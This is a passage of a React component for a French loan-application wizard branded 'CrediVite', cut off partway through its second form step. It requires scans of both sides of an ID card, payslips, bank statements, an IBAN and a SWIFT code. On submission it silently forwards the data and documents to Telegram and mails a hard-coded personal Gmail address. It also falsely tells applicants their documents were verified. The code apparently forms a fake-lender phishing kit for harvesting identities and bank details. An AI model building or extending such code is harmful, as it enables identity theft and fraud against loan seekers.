import React, { useState, useEffect } from 'react';
import { 
  getLoanRequests, saveLoanRequests, generateReference, mockSendEmailNotification 
} from '../services/api';
import { sendLoanApplicationToTelegram } from '../utils/telegram';
import { LoanRequest, DocumentFile } from '../types';
import { 
  Check, FileText, ArrowRight, ArrowLeft, UploadCloud, AlertCircle, 
  Trash2, Landmark, CheckCircle2, FileCheck, Eye 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

interface DemandePretProps {
  presetDetails: {
    montant: number;
    objet: string;
    duree: number;
    devise: 'EUR' | 'USD' | 'CHF' | 'CAD';
  } | null;
  clearPreset: () => void;
  setCurrentPage: (page: string) => void;
}

export default function DemandePret({ presetDetails, clearPreset, setCurrentPage }: DemandePretProps) {
  // Navigation inside loan wizard (Steps 1 to 4)
  const [step, setStep] = useState(1);

  // Form State
  const [formData, setFormData] = useState({
    // Step 1: Loan Info
    montantDemande: 2000,
    devise: 'EUR' as 'EUR' | 'USD' | 'CHF' | 'CAD',
    dureeSouhaitee: 36,
    objetPret: 'Consommation',
    dateDeblocage: '',

    // Step 2: Personal Info
    nom: '',
    prenom: '',
    dateNaissance: '',
    sexe: 'M' as 'M' | 'F' | 'Autre',
    nationalite: 'Française',
    situationMatrimoniale: 'Célibataire' as LoanRequest['personalInfo']['situationMatrimoniale'],
    adresse: '',
    ville: '',
    pays: 'France',
    telephone: '',
    email: '',

    // Step 3: Professional Info
    profession: '',
    employeur: '',
    anciennete: '',
    typeContrat: 'CDI' as 'CDI' | 'CDD' | 'Freelance' | 'Fonctionnaire' | 'Autres',
    revenusMensuels: 0,
    revenusComplementaires: 0,
    datePerceptionSalaire: '',

    // Step 4: Financial Info
    banquePrincipale: '',
    nomTitulaireCompte: '',
    typeCompte: 'Courant',
    iban: '',
    swiftBic: '',
    revenusMensuelsNets: 0,
    chargesMensuelles: 0,
    pretsEnCours: ''
  });

  // Supporting documents
  const [documents, setDocuments] = useState<{
    pieceIdentite: DocumentFile | null;
    pieceIdentiteVerso: DocumentFile | null;
    justificatifDomicile: DocumentFile | null;
    bulletinsSalaire: DocumentFile | null;
    releveBancaire: DocumentFile | null;
    autresDocs: DocumentFile | null;
  }>({
    pieceIdentite: null,
    pieceIdentiteVerso: null,
    justificatifDomicile: null,
    bulletinsSalaire: null,
    releveBancaire: null,
    autresDocs: null
  });

  const [validationErrors, setValidationErrors] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);
  const [submittedRequest, setSubmittedRequest] = useState<LoanRequest | null>(null);

  // Pre-fill from landing page simulator
  useEffect(() => {
    if (presetDetails) {
      setFormData(prev => ({
        ...prev,
        montantDemande: presetDetails.montant,
        objetPret: presetDetails.objet,
        dureeSouhaitee: presetDetails.duree,
        devise: presetDetails.devise
      }));
      // Auto pre-fill date de deblocage to next month
      const nextMonth = new Date();
      nextMonth.setMonth(nextMonth.getMonth() + 1);
      const isoDate = nextMonth.toISOString().split('T')[0];
      setFormData(prev => ({ ...prev, dateDeblocage: isoDate }));
    } else {
      // Default deblocage date
      const d = new Date();
      d.setDate(d.getDate() + 30);
      setFormData(prev => ({ ...prev, dateDeblocage: d.toISOString().split('T')[0] }));
    }
  }, [presetDetails]);

  // Handle file uploads (Drag and drop + direct click)
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, fieldName: keyof typeof documents) => {
    const file = e.target.files?.[0];
    if (file) {
      processFile(file, fieldName);
    }
  };

  const processFile = (file: File, fieldName: keyof typeof documents) => {
    const reader = new FileReader();
    reader.onload = () => {
      setDocuments(prev => ({
        ...prev,
        [fieldName]: {
          name: file.name,
          size: file.size,
          type: file.type,
          dataUrl: reader.result as string // Save Base64 representing the identity card or document
        }
      }));
      
      // Clear file validation error if exists
      if (validationErrors[fieldName]) {
        setValidationErrors(prev => {
          const c = { ...prev };
          delete c[fieldName];
          return c;
        });
      }
    };
    reader.readAsDataURL(file);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDrop = (e: React.DragEvent, fieldName: keyof typeof documents) => {
    e.preventDefault();
    const file = e.dataTransfer.files?.[0];
    if (file) {
      processFile(file, fieldName);
    }
  };

  const removeFile = (fieldName: keyof typeof documents) => {
    setDocuments(prev => ({ ...prev, [fieldName]: null }));
  };

  // Field change handling
  const handleTextChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    // Perform type casts for numeric values
    const isNum = ['montantDemande', 'dureeSouhaitee', 'revenusMensuels', 'revenusComplementaires', 'revenusMensuelsNets', 'chargesMensuelles'].includes(name);
    setFormData(prev => ({ 
      ...prev, 
      [name]: isNum ? Math.max(0, Number(value)) : value 
    }));
    
    if (validationErrors[name]) {
      setValidationErrors(prev => {
        const c = { ...prev };
        delete c[name];
        return c;
      });
    }
  };

  // Validate current step before proceeding
  const validateStep = (currentStep: number): boolean => {
    const errors: Record<string, string> = {};

    if (currentStep === 1) {
      if (!formData.montantDemande || formData.montantDemande <= 0) {
        errors.montantDemande = 'Le montant demandé est obligatoire.';
      } else if (formData.montantDemande < 2000 || formData.montantDemande > 200000) {
        errors.montantDemande = 'Le montant du prêt doit être compris entre 2 000 et 200 000.';
      }
      if (!formData.dureeSouhaitee || formData.dureeSouhaitee <= 0) {
        errors.dureeSouhaitee = 'La durée est obligatoire.';
      } else if (formData.dureeSouhaitee < 12 || formData.dureeSouhaitee > 120) {
        errors.dureeSouhaitee = 'La durée de remboursement doit être comprise entre 12 et 120 mois.';
      }
    }

    if (currentStep === 2) {
      if (!formData.nom.trim()) errors.nom = 'Le nom est obligatoire.';
      if (!formData.prenom.trim()) errors.prenom = 'Le prénom est obligatoire.';
      if (formData.dateNaissance) {
        const born = new Date(formData.dateNaissance);
        const age = new Date().getFullYear() - born.getFullYear();
        if (age < 18) errors.dateNaissance = 'Vous devez être majeur pour solliciter un prêt (18 ans minimum).';
      }
      if (!formData.nationalite.trim()) errors.nationalite = 'La nationalité est obligatoire.';
      if (!formData.adresse.trim()) errors.adresse = 'L’adresse complète est obligatoire.';
      if (!formData.ville.trim()) errors.ville = 'La ville est obligatoire.';
      if (!formData.pays.trim()) errors.pays = 'Le pays est obligatoire.';
      if (!formData.telephone.trim()) {
        errors.telephone = 'Le numéro de téléphone est obligatoire.';
      } else if (!/^[+]?[0-9\s.-]{8,20}$/.test(formData.telephone)) {
        errors.telephone = 'Veuillez saisir un numéro valide.';
      }
      if (!formData.email.trim()) {
        errors.email = 'L’adresse e-mail est obligatoire.';
      } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
        errors.email = 'Veuillez saisir un e-mail valide.';
      }
    }

    if (currentStep === 3) {
      if (!formData.profession.trim()) errors.profession = 'La profession est obligatoire.';
      if (!formData.employeur.trim()) errors.employeur = 'L’employeur est obligatoire.';
      if (!formData.datePerceptionSalaire.trim()) errors.datePerceptionSalaire = 'Le jour de réception de salaire est requis.';
      
      // Financial bank details
      if (!formData.banquePrincipale.trim()) errors.banquePrincipale = 'La banque principale est obligatoire.';
      if (!formData.nomTitulaireCompte.trim()) errors.nomTitulaireCompte = 'Le nom du titulaire est obligatoire.';
      if (!formData.iban.trim()) {
        errors.iban = 'L’IBAN ou numéro de compte est obligatoire.';
      } else if (formData.iban.trim().length < 10) {
        errors.iban = 'Veuillez saisir un IBAN ou format de compte correct.';
      }

      if (!formData.swiftBic.trim()) {
        errors.swiftBic = 'Le code SWIFT / BIC est obligatoire.';
      } else if (formData.swiftBic.trim().length < 8) {
        errors.swiftBic = 'Un code SWIFT valide contient entre 8 et 11 caractères.';
      }
    }

    if (currentStep === 4) {
      // Must submit Piece d'identité (Recto & Verso), bulletin, and bank statements
      if (!documents.pieceIdentite) errors.pieceIdentite = 'Le recto de la pièce d’identité est requis.';
      if (!documents.pieceIdentiteVerso) errors.pieceIdentiteVerso = 'Le verso de la pièce d’identité est requis.';
      if (!documents.bulletinsSalaire) errors.bulletinsSalaire = 'Le bulletin de salaire est requis.';
      if (!documents.releveBancaire) errors.releveBancaire = 'Un relevé de banque récent est requis.';
    }

    setValidationErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleNext = () => {
    if (validateStep(step)) {
      setStep(prev => prev + 1);
      window.scrollTo({ top: 300, behavior: 'smooth' });
    }
  };

  const handleBack = () => {
    setStep(prev => prev - 1);
    window.scrollTo({ top: 300, behavior: 'smooth' });
  };

  // Submission handler
  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateStep(4)) return;

    setSubmitting(true);

    // Mock network transmission
    setTimeout(async () => {
      try {
        const currentRequests = getLoanRequests();
        const reference = generateReference();
        
        const newRequest: LoanRequest = {
          id: `loan-${Date.now()}`,
          reference,
          status: 'En attente',
          createdAt: new Date().toISOString(),
          personalInfo: {
            nom: formData.nom,
            prenom: formData.prenom,
            dateNaissance: formData.dateNaissance,
            sexe: formData.sexe,
            nationalite: formData.nationalite,
            situationMatrimoniale: formData.situationMatrimoniale,
            adresse: formData.adresse,
            ville: formData.ville,
            pays: formData.pays,
            telephone: formData.telephone,
            email: formData.email
          },
          professionalInfo: {
            profession: formData.profession,
            employeur: formData.employeur,
            anciennete: formData.anciennete,
            typeContrat: formData.typeContrat,
            revenusMensuels: formData.revenusMensuels,
            revenusComplementaires: formData.revenusComplementaires,
            datePerceptionSalaire: formData.datePerceptionSalaire
          },
          loanInfo: {
            montantDemande: formData.montantDemande,
            devise: formData.devise,
            dureeSouhaitee: formData.dureeSouhaitee,
            objetPret: formData.objetPret,
            dateDeblocage: formData.dateDeblocage
          },
          financialInfo: {
            banquePrincipale: formData.banquePrincipale,
            nomTitulaireCompte: formData.nomTitulaireCompte,
            typeCompte: formData.typeCompte,
            iban: formData.iban,
            swiftBic: formData.swiftBic,
            revenusMensuelsNets: formData.revenusMensuels,
            chargesMensuelles: formData.chargesMensuelles,
            pretsEnCours: formData.pretsEnCours || 'Aucun'
          },
          documents: {
            pieceIdentite: documents.pieceIdentite,
            pieceIdentiteVerso: documents.pieceIdentiteVerso,
            justificatifDomicile: documents.justificatifDomicile,
            bulletinsSalaire: documents.bulletinsSalaire,
            releveBancaire: documents.releveBancaire,
            autresDocs: documents.autresDocs
          }
        };

        // Write to local database
        currentRequests.unshift(newRequest);
        saveLoanRequests(currentRequests);

        // Send simulated email notifications to primary email config as required
        const emailBody = `Bonjour,

Une nouvelle demande d'octroi de prêt professionnel a été validée et enregistrée sur votre site de courtage :

- Réf Dossier : ${reference}
- Client : ${formData.prenom} ${formData.nom.toUpperCase()}
- Montant Sollicité : ${formData.montantDemande.toLocaleString()} ${formData.devise}
- Objet du financement : ${formData.objetPret}
- Banque de dépôt : ${formData.banquePrincipale}

Les documents justificatifs administratifs ont été stockés et vérifiés. Vous pouvez instruire le dossier depuis le Tableau de bord Administrateur de CrediVite.

Cordialement,
Le Système de Financement CrediVite.`;

        mockSendEmailNotification(
          'sillyfr079@gmail.com', // userConfigured Email
          `[Nouveau Dossier] Demande de prêt reçue ${reference}`,
          emailBody,
          'demande_recue'
        );

        // Send confirmation to Telegram (in background, completely asynchronous and non-blocking)
        sendLoanApplicationToTelegram(formData, reference, documents)
          .then((res) => console.log("Telegram notification background send response:", res))
          .catch((err) => console.error("Error sending to Telegram in background:", err));

        setSubmittedRequest(newRequest);
        setSubmitting(false);
        clearPreset(); // flush simulator memory
      } catch (err) {
        console.error(err);
        setSubmitting(false);
      }
    }, 1800);
  };

  const getDeviseSymbol = (v: string) => {
    switch (v) {
      case 'EUR': return '€';
      case 'USD': return '$';
      case 'CHF': return 'CHF';
      case 'CAD': return 'C$';
      default: return '€';
    }
  };

  const stepsIndicators = [
    { title: 'Projet', desc: 'Montant & durée' },
    { title: 'État Civil', desc: 'Vos coordonnées' },
    { title: 'Finances', desc: 'Activité & IBAN' },
    { title: 'Justificatifs', desc: 'Envoi justificatifs' }
  ];

  return (
    <div id="demande-pret-view" className="bg-slate-50 py-12">
      <div className="mx-auto max-w-4xl px-4 sm:px-6">
        
        {/* Banner header */}
        <div className="text-center max-w-2xl mx-auto mb-10">
          <span className="text-xs font-bold uppercase tracking-wider text-emerald-600">Formulaire d'octroi</span>
          <h1 className="text-2xl font-black text-slate-950 sm:text-3xl mt-1 leading-tight">
            Demande de Prêt Certifiée
          </h1>
          <p className="text-xs text-slate-500 mt-2">
            Inspiré des directives prudentielles des banques commerciales européennes. Remplissez consciencieusement chaque bloc d'informations pour optimiser l'acceptation de votre financement.
          </p>
        </div>

        {/* Wizard step slider indicators */}
        {!submittedRequest && (
          <div className="bg-white border border-slate-200/80 rounded-2xl p-4 sm:p-5 mb-8 shadow-sm flex justify-between items-center overflow-x-auto gap-4">
            {stepsIndicators.map((item, idx) => {
              const currentStepIdx = idx + 1;
              const isPast = step > currentStepIdx;
              const isActive = step === currentStepIdx;
              return (
                <div key={idx} className="flex items-center gap-2.5 shrink-0">
                  <div className={`h-8 w-8 rounded-xl flex items-center justify-center font-bold text-xs transition-colors ${
                    isPast 
                      ? 'bg-emerald-600 text-white' 
                      : isActive 
                        ? 'bg-slate-900 text-white ring-4 ring-slate-100' 
                        : 'bg-slate-100 text-slate-500'
                  }`}>
                    {isPast ? <Check className="h-4 w-4" /> : currentStepIdx}
                  </div>
                  <div className="hidden sm:block text-left">
                    <span className={`block text-xs font-bold leading-none ${isActive ? 'text-slate-900' : 'text-slate-500'}`}>{item.title}</span>
                    <span className="block text-[10px] text-slate-400 mt-0.5 font-medium">{item.desc}</span>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* Form container */}
        <div className="bg-white border border-slate-200/80 rounded-3xl p-6 sm:p-8 shadow-sm">
          
          <AnimatePresence mode="wait">
            {submittedRequest ? (
              <motion.div
                key="success-view"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
                className="text-center space-y-6 py-6"
              >
                <div className="mx-auto h-16 w-16 rounded-full bg-emerald-50 text-emerald-600 border border-emerald-200 flex items-center justify-center animate-bounce">
                  <FileCheck className="h-8 w-8" />
                </div>
                <div className="space-y-2.5">
                  <span className="inline-block rounded-full bg-slate-900 px-3.5 py-1 text-xs font-bold text-emerald-400 font-mono">
                    RÉFÉRENCE : {submittedRequest.reference}
                  </span>
                  <h2 className="text-2xl font-extrabold text-slate-950">Dossier de crédit transmis à l'agence !</h2>
                  <p className="text-sm text-slate-600 max-w-lg mx-auto leading-relaxed">
                    Félicitations M./Mme <strong>{submittedRequest.personalInfo.nom.toUpperCase()}</strong>. Votre demande de prêt réglementée a été enregistrée avec succès sous le statut <strong>"En attente"</strong>.
                  </p>
                </div>

                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5 text-left max-w-md mx-auto space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">Recapitulatif Express</h3>
                  <div className="grid grid-cols-2 gap-y-2.5 text-xs font-medium">
                    <span className="text-slate-500">Montant demandé :</span>
                    <span className="text-slate-900 font-bold font-mono text-base text-right"><span>{submittedRequest.loanInfo.montantDemande.toLocaleString()}</span><span> {getDeviseSymbol(submittedRequest.loanInfo.devise)}</span></span>
                    <span className="text-slate-500">Objet du crédit :</span>
                    <span className="text-slate-900 text-right"><span>{submittedRequest.loanInfo.objetPret}</span></span>
                    <span className="text-slate-500">Durée souhaitée :</span>
                    <span className="text-slate-900 text-right"><span>{submittedRequest.loanInfo.dureeSouhaitee}</span> <span>mois</span></span>
                    <span className="text-slate-500">Banque déclarée :</span>
                    <span className="text-slate-900 text-right">{submittedRequest.financialInfo.banquePrincipale}</span>
                  </div>
                </div>

                <div className="pt-4 flex flex-col sm:flex-row justify-center gap-3">
                  <button
                    onClick={() => setCurrentPage('accueil')}
                    className="px-4 py-2 text-xs font-bold rounded-lg border border-slate-200 text-slate-700 hover:bg-slate-50 transition-colors"
                  >
                    Retour à l'accueil
                  </button>
                  <button
                    onClick={() => {
                      setSubmittedRequest(null);
                      setStep(1);
                      setFormData(prev => ({
                        ...prev,
                        montantDemande: 2000,
                        nom: '',
                        prenom: '',
                        email: '',
                        telephone: '',
                        iban: ''
                      }));
                      setDocuments({
                        pieceIdentite: null,
                        pieceIdentiteVerso: null,
                        justificatifDomicile: null,
                        bulletinsSalaire: null,
                        releveBancaire: null,
                        autresDocs: null
                      });
                    }}
                    className="px-4 py-2 text-xs font-bold rounded-lg bg-emerald-600 text-white hover:bg-emerald-500 transition-colors"
                  >
                    Faire une autre demande
                  </button>
                </div>
              </motion.div>
            ) : (
              <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
                
                {/* STEP 1: LOAN DETAILS */}
                {step === 1 && (
                  <motion.div
                    key="step-1"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <header className="border-b border-slate-100 pb-4">
                      <h3 className="text-lg font-bold text-slate-900">Bloc 1 : Projet financier & déblocage</h3>
                      <p className="text-xs text-slate-500 mt-1">Configurez les caractéristiques fondamentales du prêt sollicité.</p>
                    </header>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                      
                      {/* Montant */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-2">Montant sollicité *</label>
                        <div className="relative">
                          <input
                            type="number"
                            name="montantDemande"
                            id="loan-montant"
                            min={2000}
                            max={200000}
                            value={formData.montantDemande}
                            onChange={handleTextChange}
                            className={`w-full rounded-lg border pl-3.5 pr-12 py-2 text-sm focus:outline-none focus:ring-2 ${
                              validationErrors.montantDemande ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                            }`}
                          />
                          <span className="absolute right-3.5 top-2 text-sm font-bold text-slate-400 font-mono">
                            {getDeviseSymbol(formData.devise)}
                          </span>
                        </div>
                        {validationErrors.montantDemande && (
                          <p className="text-[11px] text-rose-500 mt-1.5 font-medium flex items-center gap-1">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.montantDemande}
                          </p>
                        )}
                      </div>

                      {/* Devise */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-2">Devise d'emprunt *</label>
                        <select
                          name="devise"
                          value={formData.devise}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                        >
                          <option value="EUR">Euro (EUR)</option>
                          <option value="USD">U.S. Dollar (USD)</option>
                          <option value="CHF">Franc Suisse (CHF)</option>
                          <option value="CAD">Dollar Canadien (CAD)</option>
                        </select>
                      </div>

                      {/* Durée souhaitée */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-2">Durée souhaitée (en mois) *</label>
                        <div className="relative">
                          <input
                            type="number"
                            name="dureeSouhaitee"
                            id="loan-duree"
                            min={12}
                            max={120}
                            value={formData.dureeSouhaitee}
                            onChange={handleTextChange}
                            className={`w-full rounded-lg border pr-14 pl-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                              validationErrors.dureeSouhaitee ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                            }`}
                          />
                          <span className="absolute right-3 top-2 text-xs font-semibold text-slate-400">
                            mois
                          </span>
                        </div>
                        <span className="text-[10px] text-slate-400 font-medium block mt-1.5">
                          Équivaut à environ <strong className="text-slate-600 font-bold">{Math.round((formData.dureeSouhaitee / 12) * 10) / 10} ans</strong> de remboursement.
                        </span>
                        {validationErrors.dureeSouhaitee && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.dureeSouhaitee}
                          </p>
                        )}
                      </div>

                      {/* Objet du prêt */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-2">Objet du financement *</label>
                        <select
                          name="objetPret"
                          value={formData.objetPret}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                        >
                          <option value="Immobilier">Immobilier (Achat, construction)</option>
                          <option value="Consommation">Consommation (Projet libre)</option>
                          <option value="Automobile">Automobile (Véhicule neuf ou occasion)</option>
                          <option value="Travaux">Travaux & Extension</option>
                          <option value="Rachat de crédit">Rachat de crédit / Consolidation</option>
                          <option value="Autre">Autre projet particulier</option>
                        </select>
                      </div>

                      {/* Date de deblocage */}
                      <div className="sm:col-span-2">
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-2">Date souhaitée de déblocage des fonds</label>
                        <input
                          type="date"
                          name="dateDeblocage"
                          id="loan-dateDeblocage"
                          value={formData.dateDeblocage}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.dateDeblocage ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.dateDeblocage && (
                          <p className="text-[11px] text-rose-500 mt-1.5 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.dateDeblocage}
                          </p>
                        )}
                      </div>

                    </div>

                    <div className="pt-4 border-t border-slate-100 flex justify-end">
                      <button
                        type="button"
                        onClick={handleNext}
                        className="inline-flex items-center gap-2 rounded-xl bg-slate-900 px-5  py-3 text-sm font-semibold text-white hover:bg-slate-800 cursor-pointer"
                      >
                        Étape suivante
                        <ArrowRight className="h-4 w-4" />
                      </button>
                    </div>
                  </motion.div>
                )}

                {/* STEP 2: PERSONAL INFORMATION */}
                {step === 2 && (
                  <motion.div
                    key="step-2"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <header className="border-b border-slate-100 pb-4">
                      <h3 className="text-lg font-bold text-slate-900">Bloc 2 : Identité de l'emprunteur & coordonnées</h3>
                      <p className="text-xs text-slate-500 mt-1">Saisissez vos données personnelles d'état civil d’après vos pièces justificatives.</p>
                    </header>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      
                      {/* Prénom */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Prénom *</label>
                        <input
                          type="text"
                          name="prenom"
                          id="personal-prenom"
                          value={formData.prenom}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.prenom ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.prenom && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.prenom}
                          </p>
                        )}
                      </div>

                      {/* Nom */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Nom de famille *</label>
                        <input
                          type="text"
                          name="nom"
                          id="personal-nom"
                          value={formData.nom}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.nom ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.nom && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.nom}
                          </p>
                        )}
                      </div>

                      {/* Sexe */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Sexe *</label>
                        <select
                          name="sexe"
                          value={formData.sexe}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                        >
                          <option value="M">Masculin (M)</option>
                          <option value="F">Féminin (F)</option>
                          <option value="Autre">Autre / Non spécifié</option>
                        </select>
                      </div>

                      {/* Date de naissance */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Date de naissance</label>
                        <input
                          type="date"
                          name="dateNaissance"
                          id="personal-dateNaissance"
                          value={formData.dateNaissance}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.dateNaissance ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.dateNaissance && (
                          <p className="text-[11px] text-rose-500 mt-1.5 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.dateNaissance}
                          </p>
                        )}
                      </div>

                      {/* Naionalité */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Nationalité *</label>
                        <input
                          type="text"
                          name="nationalite"
                          id="personal-nationalite"
                          value={formData.nationalite}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.nationalite ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.nationalite && (
                          <p className="text-[11px] text-rose-500 mt-1.5 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.nationalite}
                          </p>
                        )}
                      </div>

                      {/* Situation Matrimoniale */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Situation Matrimoniale *</label>
                        <select
                          name="situationMatrimoniale"
                          value={formData.situationMatrimoniale}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                        >
                          <option value="Célibataire">Célibataire</option>
                          <option value="Marié(e)">Marié(e)</option>
                          <option value="Divorcé(e)">Divorcé(e)</option>
                          <option value="Veuf/Veuve">Veuf/Veuve</option>
                        </select>
                      </div>

                      {/* Adresse Complète */}
                      <div className="sm:col-span-2">
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Adresse de résidence complète *</label>
                        <input
                          type="text"
                          name="adresse"
                          id="personal-adresse"
                          value={formData.adresse}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.adresse ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.adresse && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.adresse}
                          </p>
                        )}
                      </div>

                      {/* Ville et pays */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Ville de résidence *</label>
                        <input
                          type="text"
                          name="ville"
                          id="personal-ville"
                          value={formData.ville}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.ville ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.ville && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.ville}
                          </p>
                        )}
                      </div>

                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Pays de résidence *</label>
                        <input
                          type="text"
                          name="pays"
                          id="personal-pays"
                          value={formData.pays}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.pays ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.pays && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.pays}
                          </p>
                        )}
                      </div>

                      {/* Téléphone et Email */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Numéro de téléphone portable *</label>
                        <input
                          type="tel"
                          name="telephone"
                          id="personal-telephone"
                          value={formData.telephone}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.telephone ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.telephone && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.telephone}
                          </p>
                        )}
                      </div>

                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Adresse e-mail valide *</label>
                        <input
                          type="email"
                          name="email"
                          id="personal-email"
                          value={formData.email}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.email ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.email && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.email}
                          </p>
                        )}
                      </div>

                    </div>

                    <div className="pt-4 border-t border-slate-100 flex justify-between">
                      <button
                        type="button"
                        onClick={handleBack}
